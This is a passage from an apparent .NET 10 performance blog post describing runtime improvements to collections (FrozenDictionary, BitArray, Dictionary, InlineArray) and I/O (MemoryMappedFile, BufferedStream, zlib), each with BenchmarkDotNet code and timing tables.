when <code>TKey</code> is any primitive integral type that&rsquo;s the size of an <code>int</code> or smaller (e.g. <code>byte</code>, <code>char</code>, <code>ushort</code>, etc.) as well as enums backed by such primitives (which represent the vast, vast majority of enums used in practice). In particular, they handle the common case where these values are densely packed, in which case they implement the dictionary as an array that it can index into based on the integer&rsquo;s value. This makes for a very efficient lookup, while not consuming too much additional space: it&rsquo;s only used when the values are dense and thus won&rsquo;t be wasting many empty slots in the array.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.Frozen; using System.Net; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "status")] public partial class Tests { private static readonly FrozenDictionary<httpstatuscode> s_statusDescriptions = Enum.GetValues<httpstatuscode>().Distinct() .ToFrozenDictionary(status =&gt; status, status =&gt; status.ToString()); [Benchmark] [Arguments(HttpStatusCode.OK)] public string Get(HttpStatusCode status) =&gt; s_statusDescriptions[status]; }</httpstatuscode></httpstatuscode></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Get</td> <td>.NET 9.0</td> <td>2.0660 ns</td> <td>1.00</td> </tr> <tr> <td>Get</td> <td>.NET 10.0</td> <td>0.8735 ns</td> <td>0.42</td> </tr> </tbody> </table><p>Both <code>FrozenDictionary<tkey></tkey></code> and <code>FrozenSet<t></t></code> also improve with regards to the alternate lookup functionality introduced in .NET 9. Alternate lookups are a mechanism that enables getting a proxy for a dictionary or set that&rsquo;s keyed with a different key from <code>TKey</code>, most commonly a <code>ReadOnlySpan<char></char></code> when <code>TKey</code> is <code>string</code>. As noted, both <code>FrozenDictionary<tkey></tkey></code> and <code>FrozenSet<t></t></code> achieve their goals by having different implementations based on the nature of the indexed data, and that specialization is achieved by virtual methods that derived specializations override. The JIT is typically able to minimize the costs of such virtuals, especially if the collections are stored in <code>static readonly</code> fields. However, the alternate lookup support complicated things, as it introduced a virtual method with a generic method parameter (the alternate key type), otherwise known as GVM. &ldquo;GVM&rdquo; might as well be a four-letter word in performance circles, as they&rsquo;re hard for the runtime to optimize. The purpose of these alternate lookups is primarily performance, but the use of a GVM significantly reduced those performance gains. <a href="https://github.com/dotnet/runtime/pull/108732">dotnet/runtime#108732</a> from <a href="https://github.com/andrewjsaid">@andrewjsaid</a> addresses this by changing the frequency with which a GVM needs to be invoked. Rather than the lookup operation itself being a generic virtual method, the PR introduces a separate generic virtual method that retrieves a delegate for performing the lookup; the retrieval of that delegate still incurs GVM penalties, but once the delegate is retrieved, it can be cached, and invoking it does not incur said overheads. This results in measurable improvements on throughput.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.Frozen; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly FrozenDictionary<string> s_d = new Dictionary<string> { ["one"] = 1, ["two"] = 2, ["three"] = 3, ["four"] = 4, ["five"] = 5, ["six"] = 6, ["seven"] = 7, ["eight"] = 8, ["nine"] = 9, ["ten"] = 10, ["eleven"] = 11, ["twelve"] = 12, }.ToFrozenDictionary(); [Benchmark] public int Get() { var alternate = s_d.GetAlternateLookup<readonlyspan>&gt;(); return alternate["one"] + alternate["two"] + alternate["three"] + alternate["four"] + alternate["five"] + alternate["six"] + alternate["seven"] + alternate["eight"] + alternate["nine"] + alternate["ten"] + alternate["eleven"] + alternate["twelve"]; } }</readonlyspan></string></string></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Get</td> <td>.NET 9.0</td> <td>133.46 ns</td> <td>1.00</td> </tr> <tr> <td>Get</td> <td>.NET 10.0</td> <td>81.39 ns</td> <td>0.61</td> </tr> </tbody> </table> <h3>BitArray</h3><p><code>BitArray</code> provides support for exactly what its name says, a bit array. You create it with the desired number of values and can then read and write a <code>bool</code> for each index, turning the corresponding bit to <code>1</code> or <code>0</code> accordingly. It also provides a variety of helper operations for processing the whole bit array, such as for Boolean logic operations like <code>And</code> and <code>Not</code>. Where possible, those operations are vectorized, taking advantage of SIMD to process many bits per instruction.</p><p>However, for situations where you want to write custom manipulations of the bits, you only have two options: use the indexer (or corresponding <code>Get</code> and <code>Set</code> methods), which means multiple instructions required to process each bit, or use <code>CopyTo</code> to extract all of the bits to a separate array, which means you need to allocate (or at least rent) such an array and pay for the memory copy before you can then manipulate the bits. There&rsquo;s also not a great way to then copy those bits back if you wanted to manipulate the <code>BitArray</code> in place.</p><p><a href="https://github.com/dotnet/runtime/pull/116308">dotnet/runtime#116308</a> adds a <code>CollectionsMarshal.AsBytes(BitArray)</code> method that returns a <code>Span<byte></byte></code> directly referencing the <code>BitArray</code>&lsquo;s underlying storage. This provides a very efficient way to get access to all the bits, which then makes it possible to write (or reuse) vectorized algorithms. Say, for example, you wanted to use a <code>BitArray</code> to represent a binary embedding (an &ldquo;embedding&rdquo; is a vector representation of the semantic meaning of some data, basically an array of numbers, each one corresponding to some aspect of the data; a binary embedding uses a single bit for each number). To determine how semantically similar two inputs are, you get an embedding for each and then perform a distance or similarity calculation on the two. For binary embeddings, a common distance metric is &ldquo;hamming distance,&rdquo; which effectively lines up the bits and tells you the number of positions that have different values, e.g. <code>0b1100</code> and <code>0b1010</code> have a hamming distance of 2. Helpfully, <code>TensorPrimitives.HammingBitDistance</code> provides an implementation of this, accepting two <code>ReadOnlySpan<t></t></code>s and computing the number of bits that differ between them. With <code>CollectionsMarshal.AsBytes</code>, we can now utilize that helper directly with the contents of <code>BitArray</code>s, both saving us the effort of having to write it manually and benefiting from any optimizations in <code>HammingBitDistance</code> itself.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections; using System.Numerics.Tensors; using System.Runtime.InteropServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private BitArray _bits1, _bits2; [GlobalSetup] public void Setup() { Random r = new(42); byte[] bytes = new byte[128]; r.NextBytes(bytes); _bits1 = new BitArray(bytes); r.NextBytes(bytes); _bits2 = new BitArray(bytes); } [Benchmark(Baseline = true)] public long HammingDistanceManual() { long distance = 0; for (int i = 0; i &lt; _bits1.Length; i++) { if (_bits1[i] != _bits2[i]) { distance++; } } return distance; } [Benchmark] public long HammingDistanceTensorPrimitives() =&gt; TensorPrimitives.HammingBitDistance( CollectionsMarshal.AsBytes(_bits1), CollectionsMarshal.AsBytes(_bits2)); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>HammingDistanceManual</td> <td>1,256.72 ns</td> <td>1.00</td> </tr> <tr> <td>HammingDistanceTensorPrimitives</td> <td>63.29 ns</td> <td>0.05</td> </tr> </tbody> </table><p>The main motivation for this PR was adding the <code>AsBytes</code> method, but doing so triggered a series of other modifications that themselves help with performance. For example, rather than backing the <code>BitArray</code> with an <code>int[]</code> as was previously done, it&rsquo;s now backed by a <code>byte[]</code>, and rather than reading elements one by one in the <code>byte[]</code>-based constructor, vectorized copy operations are now being used (they were already being used and continue to be used in the <code>int[]</code>-based constructor).</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _byteData = Enumerable.Range(0, 512).Select(i =&gt; (byte)i).ToArray(); [Benchmark] public BitArray ByteCtor() =&gt; new BitArray(_byteData); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>ByteCtor</td> <td>.NET 9.0</td> <td>160.10 ns</td> <td>1.00</td> </tr> <tr> <td>ByteCtor</td> <td>.NET 10.0</td> <td>83.07 ns</td> <td>0.52</td> </tr> </tbody> </table> <h3>Other Collections</h3><p>There are a variety of other notable improvements in collections:</p><ul> <li><strong><code>List<t></t></code></strong>. <a href="https://github.com/dotnet/runtime/pull/107683">dotnet/runtime#107683</a> from <a href="https://github.com/karakasa">@karakasa</a> builds on a change that was made in .NET 9 to improve the performance of using <code>InsertRange</code> on a <code>List<t></t></code> to insert a <code>ReadOnlySpan<t></t></code>. When a full <code>List<t></t></code> is appended to, the typical process is a new larger array is allocated, all of the existing elements are copied over (one array copy), and then the new element is stored into the array in the next available slot. If that same growth routine is used when <em>inserting</em> rather than <em>appending</em> an element, you possibly end up copying some elements twice: you first copy over all of the elements into the new array, and then to handle the insert, you may again need to copy some of the elements you already copied as part of shifting them to make room for the insertion at the new location. In the extreme, if you&rsquo;re inserting at index 0, you copy all of the elements into the new array, and then you copy all of the elements again to shift them by one slot. The same applies when inserting a range of elements, so with this PR, rather than first copying over all of the elements and then shifting a subset, <code>List<t></t></code> now grows by copying the elements above and below the target range for the insertion to their correct location and then fills in the target range with the inserted elements.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private readonly int[] _data = [1, 2, 3, 4]; [Benchmark] public List<int> Test() { List<int> list = new(4); list.AddRange(_data); list.InsertRange(0, _data); return list; } }</int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Test</td> <td>.NET 9.0</td> <td>48.65 ns</td> <td>1.00</td> </tr> <tr> <td>Test</td> <td>.NET 10.0</td> <td>30.07 ns</td> <td>0.62</td> </tr> </tbody> </table> </li> <li><strong><code>ConcurrentDictionary<tkey></tkey></code></strong>. <a href="https://github.com/dotnet/runtime/pull/108065">dotnet/runtime#108065</a> from <a href="https://github.com/koenigst">@koenigst</a> changes how a <code>ConcurrentDictionary</code>&lsquo;s backing array is sized when it&rsquo;s cleared. <code>ConcurrentDictionary</code> is implemented with an array of linked lists, and when the collection is constructed, a constructor parameter allows for presizing that array. Due to the concurrent nature of the dictionary and its implementation, <code>Clear</code>&lsquo;ing it necessitates creating a new array rather than just using part of the old one. When that new array was created, it reset to using the default size. This PR tweaks that to remember the initial capacity requested by the user, and using that initial size again when constructing the new array.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.Concurrent; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private ConcurrentDictionary<int> _data = new(concurrencyLevel: 1, capacity: 1024); [Benchmark] public void ClearAndAdd() { _data.Clear(); for (int i = 0; i &lt; 1024; i++) { _data.TryAdd(i, i); } } }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ClearAndAdd</td> <td>.NET 9.0</td> <td>51.95 us</td> <td>1.00</td> <td>134.36 KB</td> <td>1.00</td> </tr> <tr> <td>ClearAndAdd</td> <td>.NET 10.0</td> <td>30.32 us</td> <td>0.58</td> <td>48.73 KB</td> <td>0.36</td> </tr> </tbody> </table> </li> <li><strong><code>Dictionary<tkey></tkey></code></strong>. <code>Dictionary</code> is one of the most popular collection types across .NET, and <code>TKey</code> == <code>string</code> is one of (if not <em>the</em>) most popular forms. <a href="https://github.com/dotnet/runtime/pull/117427">dotnet/runtime#117427</a> makes dictionary lookups with constant <code>string</code>s much faster. You might expect it would be a complicated change, but it ends up being just a few strategic tweaks. A variety of methods for operating on <code>string</code>s are already known to the JIT and already have optimized implementations for when dealing with constants. All this PR needed to do was change which methods <code>Dictionary<tkey></tkey></code> was using in its optimized <code>TryGetValue</code> lookup path, and because that path is often inlined, a constant argument to <code>TryGetValue</code> can be exposed as a constant to these helpers, e.g. <code>string.Equals</code>.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Dictionary<string> _data = new() { ["a"] = 1, ["b"] = 2, ["c"] = 3, ["d"] = 4, ["e"] = 5 }; [Benchmark] public int Get() =&gt; _data["a"] + _data["b"] + _data["c"] + _data["d"] + _data["e"]; }</string></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Get</td> <td>.NET 9.0</td> <td>33.81 ns</td> <td>1.00</td> </tr> <tr> <td>Get</td> <td>.NET 10.0</td> <td>14.02 ns</td> <td>0.41</td> </tr> </tbody> </table> </li> <li><strong><code>OrderedDictionary<tkey></tkey></code></strong>. <a href="https://github.com/dotnet/runtime/pull/109324">dotnet/runtime#109324</a> adds new overloads of <code>TryAdd</code> and <code>TryGetValue</code> that provide the index of the added or retrieved element in the collection. This index can then be used in subsequent operations on the dictionary to access the same slot. For example, if you want to implement an <code>AddOrUpdate</code> operation on top of <code>OrderedDictionary</code>, you need to perform one or two operations, first trying to add the item, and then if found to already exist, updating it, and that update can benefit from targeting the exact index that contains the element rather than it needing to do another keyed lookup.<pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private OrderedDictionary<string> _dictionary = new(); [Benchmark(Baseline = true)] public void Old() =&gt; AddOrUpdate_Old(_dictionary, "key", k =&gt; 1, (k, v) =&gt; v + 1); [Benchmark] public void New() =&gt; AddOrUpdate_New(_dictionary, "key", k =&gt; 1, (k, v) =&gt; v + 1); private static void AddOrUpdate_Old(OrderedDictionary<string> d, string key, Func<string> addFunc, Func<string> updateFunc) { if (d.TryGetValue(key, out int existing)) { d[key] = updateFunc(key, existing); } else { d.Add(key, addFunc(key)); } } private static void AddOrUpdate_New(OrderedDictionary<string> d, string key, Func<string> addFunc, Func<string> updateFunc) { if (d.TryGetValue(key, out int existing, out int index)) { d.SetAt(index, updateFunc(key, existing)); } else { d.Add(key, addFunc(key)); } } }</string></string></string></string></string></string></string></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Old</td> <td>6.961 ns</td> <td>1.00</td> </tr> <tr> <td>New</td> <td>4.201 ns</td> <td>0.60</td> </tr> </tbody> </table> </li> <li><strong><code>ImmutableArray<t></t></code></strong>. The <code>ImmutableCollectionsMarshal</code> class already exposes an <code>AsArray</code> method that enables retrieving the backing <code>T[]</code> from an <code>ImmutableArray<t></t></code>. However, if you had an <code>ImmutableArray<t>.Builder</t></code>, there was previously no way to access the backing store it was using. <a href="https://github.com/dotnet/runtime/pull/112177">dotnet/runtime#112177</a> enables doing so, with an <code>AsMemory</code> method that retrieves the underlying storage as a <code>Memory<t></t></code>.</li> <li><strong><code>InlineArray</code></strong>. .NET 8 introduced <code>InlineArrayAttribute</code>, which can be used to attribute a struct containing a single field; the attribute accepts a count, and the runtime replicates the struct&rsquo;s field that number of times, as if you&rsquo;d logically copy/pasted the field repeatedly. The runtime also ensures that the storage is contiguous and appropriately aligned, such that if you had an indexible collection that pointed to the beginning of the struct, you could use it as an array. And it so happens such a collection exists: <code>Span<t></t></code>. C# 12 then makes it easy to treat any such attributed struct as a span, e.g.<pre><code>[InlineArray(8)] internal struct EightStrings { private string _field; } ... EightStrings strings = default; Span<string> span = strings;</string></code></pre><p>The C# compiler will itself emit code that uses this capability. For example, if you use collection expressions to initialize a span, you&rsquo;re likely triggering the compiler to emit an <code>InlineArray</code>. When I write this:</p><pre><code>public void M(int a, int b, int c, int d) { Span<int> span = [a, b, c, d]; }</int></code></pre><p>the compiler emits something like the following equivalent:</p><pre><code>public void M(int a, int b, int c, int d) { &lt;&gt;y__InlineArray4<int> buffer = default(&lt;&gt;y__InlineArray4<int>);<privateimplementationdetails>.InlineArrayElementRef&lt;&lt;&gt;y__InlineArray4<int>, int&gt;(ref buffer, 0) = a;<privateimplementationdetails>.InlineArrayElementRef&lt;&lt;&gt;y__InlineArray4<int>, int&gt;(ref buffer, 1) = b;<privateimplementationdetails>.InlineArrayElementRef&lt;&lt;&gt;y__InlineArray4<int>, int&gt;(ref buffer, 2) = c;<privateimplementationdetails>.InlineArrayElementRef&lt;&lt;&gt;y__InlineArray4<int>, int&gt;(ref buffer, 3) = d;<privateimplementationdetails>.InlineArrayAsSpan&lt;&lt;&gt;y__InlineArray4<int>, int&gt;(ref buffer, 4); }</int></privateimplementationdetails></int></privateimplementationdetails></int></privateimplementationdetails></int></privateimplementationdetails></int></privateimplementationdetails></int></int></code></pre><p>where it has defined that <code>&lt;&gt;y__InlineArray4</code> like this:</p><pre><code>[StructLayout(LayoutKind.Auto)] [InlineArray(4)] internal struct &lt;&gt;y__InlineArray4<t> { [CompilerGenerated] private T _element0; }</t></code></pre><p>This shows up elsewhere, too. For example, C# 13 introduced support for using <code>params</code> with collections other than arrays, including spans, so now I can write this:</p><pre><code>public void Caller(int a, int b, int c, int d) =&gt; M(a, b, c, d); public void M(params ReadOnlySpan<int> span) { }</int></code></pre><p>and for <code>Caller</code> we&rsquo;ll see very similar code emitted to what I previously showed, with the compiler manufacturing such an <code>InlineArray</code> type. As you might imagine, the popularity of the features that cause the compiler to produce these types has caused there to be a lot of them emitted. Each type is specific to a particular length, so while the compiler will reuse them, a) it can end up needing to emit a lot to cover different lengths, and b) it emits them as internal to each assembly that needs them, so there can end up being a lot of duplication. Looking just at the shared framework for .NET 9 (the core libraries like <code>System.Private.CoreLib</code> that ship as part of the runtime), there are ~140 of these types&hellip; all of which are for sizes no larger than 8. For .NET 10, <a href="https://github.com/dotnet/runtime/pull/113403">dotnet/runtime#113403</a> adds a set of public <code>InlineArray2<t></t></code>, <code>InlineArray3<t></t></code>, etc., that should cover the vast majority of sizes the compiler would otherwise need to emit types. In the near future, the C# compiler will be updated to use those new types when available instead of emitting its own, thereby yielding non-trivial size savings.</p></li> </ul> <h2>I/O</h2><p>In previous .NET releases, there have been concerted efforts that have invested a lot in improving specific areas of I/O performance, such as completely rewriting <code>FileStream</code> in .NET 6. Nothing as comprehensive as that was done for I/O in .NET 10, but there are some nice one-off improvements that can still have a measurable impact on certain scenarios.</p><p>On Unix, when a <code>MemoryMappedFile</code> is created and it&rsquo;s not associated with a particular <code>FileStream</code>, it needs to create some kind of backing memory for the MMF&rsquo;s data. On Linux, it&rsquo;d try to use <code>shm_open</code>, which creates a shared memory object with appropriate semantics. However, in the years since <code>MemoryMappedFile</code> was initially enabled on Linux, the Linux kernel has added support for anonymous files and the <code>memfd_create</code> function that creates them. These are ideal for <code>MemoryMappedFile</code> and much more efficient, so <a href="https://github.com/dotnet/runtime/pull/105178">dotnet/runtime#105178</a> from <a href="https://github.com/am11">@am11</a> switches over to using <code>memfd_create</code> when it&rsquo;s available.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.IO.MemoryMappedFiles; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public void MMF() { using MemoryMappedFile mff = MemoryMappedFile.CreateNew(null, 12345); using MemoryMappedViewAccessor accessor = mff.CreateViewAccessor(); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>MMF</td> <td>.NET 9.0</td> <td>9.916 us</td> <td>1.00</td> </tr> <tr> <td>MMF</td> <td>.NET 10.0</td> <td>6.358 us</td> <td>0.64</td> </tr> </tbody> </table><p><code>FileSystemWatcher</code> is improved in <a href="https://github.com/dotnet/runtime/pull/116830">dotnet/runtime#116830</a>. The primary purpose for this PR was to fix a memory leak, where on Windows disposing of a <code>FileSystemWatcher</code> while it was in use could end up leaking some objects. However, it also addresses a performance issue specific to Windows. <code>FileSystemWatcher</code> needs to pass a buffer to the OS for the OS to populate with file-changed information. That meant that <code>FileSystemWatcher</code> was allocating a managed array and then immediately pinning that buffer so it could pass a pointer to it into native code. For certain consumption of <code>FileSystemWatcher</code>, especially in scenarios where lots of <code>FileSystemWatcher</code> instances are created, that pinning could contribute to non-trivial heap fragmentation. Interestingly, though, this array is effectively never consumed as an array: all of the writes into it are performed in native code via the pointer that was passed to the OS, and all consumption of it in managed code to read out the events are done via a span. That means the array nature of it doesn&rsquo;t really matter, and we&rsquo;re better off just allocating a native rather than managed buffer that then requires pinning.</p><pre><code>// Run on Windows. // dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public void FSW() { using FileSystemWatcher fsw = new(Environment.CurrentDirectory); fsw.EnableRaisingEvents = true; } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>FSW</td> <td>.NET 9</td> <td>61.46 us</td> <td>1.00</td> <td>8944 B</td> <td>1.00</td> </tr> <tr> <td>FSW</td> <td>.NET 10</td> <td>61.21 us</td> <td>1.00</td> <td>744 B</td> <td>0.08</td> </tr> </tbody> </table><p><code>BufferedStream</code> gets a boost from <a href="https://github.com/dotnet/runtime/pull/104822">dotnet/runtime#104822</a> from <a href="https://github.com/ANahr">@ANahr</a>. There is a curious and problematic inconsistency in <code>BufferedStream</code> that&rsquo;s been there since, well, forever as far as I can tell. It&rsquo;s obviously been revisited in the past, and due to the super duper strong backwards compatibility concerns for .NET Framework (where a key feature is that the framework doesn&rsquo;t change), the issue was never fixed. There&rsquo;s even a <a href="https://github.com/microsoft/referencesource/blob/f7df9e2399ecd273e90908ac11caf1433e142448/mscorlib/system/io/bufferedstream.cs#L1263">comment in the code</a> to this point:</p><pre><code>// We should not be flushing here, but only writing to the underlying stream, but previous version flushed, so we keep this.</code></pre><p>A <code>BufferedStream</code> does what its name says. It wraps an underlying <code>Stream</code> and buffers access to it. So, for example, if it were configured with a buffer size of 1000, and you wrote 100 bytes to the <code>BufferedStream</code> at a time, your first 10 writes would just go to the buffer and the underlying <code>Stream</code> wouldn&rsquo;t be touched at all. Only on the 11th write would the buffer be full and need to be flushed (meaning written) to the underlying <code>Stream</code>. So far, so good. Moreover, there&rsquo;s a difference between flushing to the underlying stream and flushing the underlying stream. Those sound almost identical, but they&rsquo;re not: in the former case, we&rsquo;re effectively calling <code>_stream.Write(buffer)</code> to write the buffer to that stream, and in the latter case, we&rsquo;re effectively calling <code>_stream.Flush()</code> to force any buffering <em>that</em> stream was doing to propagate it to <em>its</em> underlying destination. <code>BufferedStream</code> really shouldn&rsquo;t be in the business of doing the latter when <code>Write</code>&lsquo;ing to the <code>BufferedStream</code>, and in general it wasn&rsquo;t&hellip; except in one case. Whereas most of the writing-related methods would not call <code>_stream.Flush()</code>, for some reason <code>WriteByte</code> did. In particular for cases where the <code>BufferedStream</code> is configured with a small buffer, and where the underlying stream&rsquo;s flush is relatively expensive (e.g. <code>DeflateStream.Flush</code> forces any buffered bytes to be compressed and emitted), that can be problematic for performance, nevermind the inconsistency. This change simply fixes the inconsistency, such that <code>WriteByte</code> no longer forces a flush on the underlying stream.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.IO.Compression; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _bytes; [GlobalSetup] public void Setup() { _bytes = new byte[1024 * 1024]; new Random(42).NextBytes(_bytes); } [Benchmark] public void WriteByte() { using Stream s = new BufferedStream(new DeflateStream(Stream.Null, CompressionLevel.SmallestSize), 256); foreach (byte b in _bytes) { s.WriteByte(b); } } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>WriteByte</td> <td>.NET 9.0</td> <td>73.87 ms</td> <td>1.00</td> </tr> <tr> <td>WriteByte</td> <td>.NET 10.0</td> <td>17.77 ms</td> <td>0.24</td> </tr> </tbody> </table><p>While on the subject of compression, it&rsquo;s worth calling out several improvements in <code>System.IO.Compression</code> in .NET 10, too. As noted in <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">Performance Improvements in .NET 9</a>, <code>DeflateStream</code>/<code>GZipStream</code>/<code>ZLibStream</code> are managed wrappers around an underlying native <code>zlib</code> library. For a long time, that was the original <code>zlib</code> (<a href="https://github.com/madler/zlib">madler/zlib</a>). Then it was Intel&rsquo;s <code>zlib-intel</code> fork (<a href="https://github.com/intel/zlib">intel/zlib</a>), which is now archived and no longer maintained. In .NET 9, the library switched to using <code>zlib-ng</code> (<a href="https://github.com/zlib-ng/zlib-ng">zlib-ng/zlib-ng</a>), which is a modernized fork that&rsquo;s well-maintained and optimized for a large number of hardware architectures. .NET 9 is based on <code>zlib-ng</code> 2.2.1. <a href="https://github.com/dotnet/runtime/pull/118457">dotnet/runtime#118457</a> updates it to use <code>zlib-ng</code> 2.2.5. Compared with the 2.2.1 release, there are a variety of performance improvements in <code>zlib-ng</code> itself, which .NET 10 then inherits, such as improved used of AVX2 and AVX512. Most importantly, though, the update includes a <a href="https://github.com/zlib-ng/zlib-ng/pull/1938">revert</a> that undoes a cleanup change in the 2.2.0 release; the original change removed a workaround for a function that had been slow and was found to no longer be slow, but as it turns out, it&rsquo;s still slow in some circumstances (long, <em>highly</em> compressible data), resulting in a throughput regression. The fix in 2.2.5 puts back the workaround to fix the regression.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.IO.Compression; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _data = new HttpClient().GetByteArrayAsync(@"https://raw.githubusercontent.com/dotnet/runtime-assets/8d362e624cde837ec896e7fff04f2167af68cba0/src/System.IO.Compression.TestData/DeflateTestData/xargs.1").Result; [Benchmark] public void Compress() { using ZLibStream z = new(Stream.Null, CompressionMode.Compress); for (int i = 0; i &lt; 100; i++) { z.Write(_data); } } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Compress</td> <td>.NET 9.0</td> <td>202.79 us</td> <td>1.00</td> </tr> <tr> <td>Compress</td> <td>.NET 10.0</td> <td>70.45 us</td> <td>0.35</td> </tr> </tbody> </table><p>The managed wrapper for <code>zlib</code> also gains some improvements. <a href="https://github.com/dotnet/runtime/pull/113587">dotnet/runtime#113587</a> from <a href="https://github.com/edwardneal">@edwardneal</a> improves the case where multiple gzip payloads are being read from the underlying <code>Stream</code>. Due to its nature, multiple complete gzip payloads can be written one after the other, and a single <code>GZipStream</code> can be used to decompress all of them as if they were one. Each time it hit a boundary between payloads, the managed wrapper was throwing away the old interop handles and creating new ones, but it can instead take advantage of reset capabilities in the underlying <code>zlib</code> library, shaving off some cycles associated with freeing and re-allocating the underlying data structures. This is a very biased micro-benchmark (a stream containing a 1000 gzip payloads that each decompresses into a single byte), highlighting the worst case, but it exemplifies the issue:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.IO.Compression; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private MemoryStream _data; [GlobalSetup] public void Setup() { _data = new MemoryStream(); for (int i = 0; i &lt; 1000; i++) { using GZipStream gzip = new(_data, CompressionMode.Compress, leaveOpen: true); gzip.WriteByte(42); } } [Benchmark] public void Decompress() { _data.Position = 0; using GZipStream gzip = new(_data, CompressionMode.Decompress, leaveOpen: true); gzip.CopyTo(Stream.Null); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Decompress</td> <td>.NET 9.0</td> <td>331.3 us</td> <td>1.00</td> </tr> <tr> <td>Decompress</td> <td>.NET 10.0</td> 